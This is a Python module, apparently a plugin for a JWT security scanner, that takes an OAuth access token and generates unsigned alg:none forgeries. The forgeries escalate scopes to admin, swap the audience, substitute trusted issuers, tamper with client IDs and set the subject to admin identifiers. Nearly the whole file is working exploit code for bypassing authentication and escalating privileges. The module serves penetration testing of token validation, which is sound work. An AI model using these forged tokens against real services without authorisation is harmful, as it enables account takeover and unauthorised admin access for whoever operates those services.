"""
extensions/oauth_mutator.py - OAuth 2.0 Bearer Token Mutation Extension

Targets OAuth 2.0 misconfiguration patterns in JWT-format access tokens:
- Scope escalation (adding admin/write scopes to scp/scope claim)
- Audience confusion (swapping aud claim)
- Issuer substitution (replacing iss with trusted external issuers)
- Client ID injection (azp / client_id tampering)
- Subject substitution (swapping sub to admin identifiers)

Usage:
    from extensions.oauth_mutator import OAuthMutator
    mutator = OAuthMutator(token)
    mutations = mutator.generate_all_mutations()
"""

import json
import base64
import copy
from typing import List, Dict, Any


def _b64url_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


class OAuthMutator:
    """
    Generates OAuth 2.0 access token mutations for security testing.

    Assumes the token is a JWT-format OAuth access token (RFC 9068).
    All forged tokens use alg:none — testing whether the server
    validates the signature on OAuth tokens.
    """

    ADMIN_SCOPES = [
        "admin",
        "admin:all",
        "write:admin",
        "read:admin write:admin",
        "*",
        "openid profile email admin",
        "urn:ietf:params:oauth:scope:admin",
    ]

    COMMON_ISSUERS = [
        "https://accounts.google.com",
        "https://login.microsoftonline.com/common/v2.0",
        "https://auth0.com/",
        "http://localhost",
        "https://attacker.example.com",
    ]

    def __init__(self, token: str, verbose: bool = False):
        self.token   = token
        self.verbose = verbose
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError("OAuthMutator requires a JWT-format token (3 dot-separated parts)")
        self.header  = json.loads(_b64url_decode(parts[0]))
        self.payload = json.loads(_b64url_decode(parts[1]))
        self.parts   = parts

    def _forge(self, header: dict, payload: dict) -> str:
        """Produce an unsigned (alg:none) token with the given claims."""
        h = _b64url_encode(json.dumps({**header, "alg": "none"}, separators=(",", ":")).encode())
        p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        return f"{h}.{p}."

    # ── 1. Scope escalation ───────────────────────────────────────────────────

    def mut_scope_escalation(self) -> List[Dict[str, Any]]:
        """Escalate scope/scp claims to admin-level values."""
        mutations = []
        for field in ["scope", "scp", "scopes"]:
            if field in self.payload:
                original = self.payload[field]
                for new_scope in self.ADMIN_SCOPES[:3]:
                    p = copy.deepcopy(self.payload)
                    p[field] = new_scope
                    mutations.append({
                        "name": f"OAuth Scope Escalation: {field}='{new_scope}'",
                        "category": "OAuth-Specific",
                        "token": self._forge(self.header, p),
                        "description": f"Changed {field} from '{original}' to '{new_scope}'.",
                        "severity_hint": "CRITICAL",
                        "mutation_detail": {"field": field, "original": original, "new": new_scope},
                    })
        return mutations

    # ── 2. Audience confusion ─────────────────────────────────────────────────

    def mut_audience_confusion(self) -> List[Dict[str, Any]]:
        """Replace aud with wildcard or attacker-controlled values."""
        mutations = []
        original_aud = self.payload.get("aud", "<absent>")
        for aud_val in ["*", "any", "all", "https://attacker.example.com"]:
            p = copy.deepcopy(self.payload)
            p["aud"] = aud_val
            mutations.append({
                "name": f"OAuth Audience Confusion: aud='{aud_val}'",
                "category": "OAuth-Specific",
                "token": self._forge(self.header, p),
                "description": f"Replaced aud ('{original_aud}') with '{aud_val}'.",
                "severity_hint": "HIGH",
                "mutation_detail": {"original_aud": original_aud, "new_aud": aud_val},
            })
        return mutations

    # ── 3. Issuer substitution ────────────────────────────────────────────────

    def mut_issuer_substitution(self) -> List[Dict[str, Any]]:
        """Replace iss with known trusted third-party issuers."""
        mutations = []
        original_iss = self.payload.get("iss", "<absent>")
        for issuer in self.COMMON_ISSUERS:
            if issuer == original_iss:
                continue
            p = copy.deepcopy(self.payload)
            p["iss"] = issuer
            mutations.append({
                "name": f"OAuth Issuer Substitution: iss='{issuer[:50]}'",
                "category": "OAuth-Specific",
                "token": self._forge(self.header, p),
                "description": f"Replaced iss with trusted issuer '{issuer}'.",
                "severity_hint": "HIGH",
                "mutation_detail": {"original_iss": original_iss, "new_iss": issuer},
            })
        return mutations

    # ── 4. Client ID injection ────────────────────────────────────────────────

    def mut_client_id_injection(self) -> List[Dict[str, Any]]:
        """Tamper with client_id / azp (authorized party) claims."""
        mutations = []
        for field in ["client_id", "azp", "appid"]:
            for val in ["admin_client", "internal_service", "*"]:
                p = copy.deepcopy(self.payload)
                original = p.get(field, "<absent>")
                p[field] = val
                mutations.append({
                    "name": f"OAuth Client Injection: {field}='{val}'",
                    "category": "OAuth-Specific",
                    "token": self._forge(self.header, p),
                    "description": f"Set {field} to '{val}' (was '{original}').",
                    "severity_hint": "MEDIUM",
                    "mutation_detail": {"field": field, "original": original, "value": val},
                })
        return mutations

    # ── 5. Subject substitution ───────────────────────────────────────────────

    def mut_subject_substitution(self) -> List[Dict[str, Any]]:
        """Replace sub with common admin user identifiers."""
        mutations = []
        original_sub = self.payload.get("sub", "<absent>")
        for sub_val in ["admin", "1", "0", "root", "service_account"]:
            if sub_val == original_sub:
                continue
            p = copy.deepcopy(self.payload)
            p["sub"] = sub_val
            mutations.append({
                "name": f"OAuth Subject Substitution: sub='{sub_val}'",
                "category": "OAuth-Specific",
                "token": self._forge(self.header, p),
                "description": f"Replaced sub ('{original_sub}') with '{sub_val}'.",
                "severity_hint": "HIGH",
                "mutation_detail": {"original_sub": original_sub, "new_sub": sub_val},
            })
        return mutations

    def generate_all_mutations(self) -> List[Dict[str, Any]]:
        mutations = []
        mutations.extend(self.mut_scope_escalation())
        mutations.extend(self.mut_audience_confusion())
        mutations.extend(self.mut_issuer_substitution())
        mutations.extend(self.mut_client_id_injection())
        mutations.extend(self.mut_subject_substitution())
        return mutations
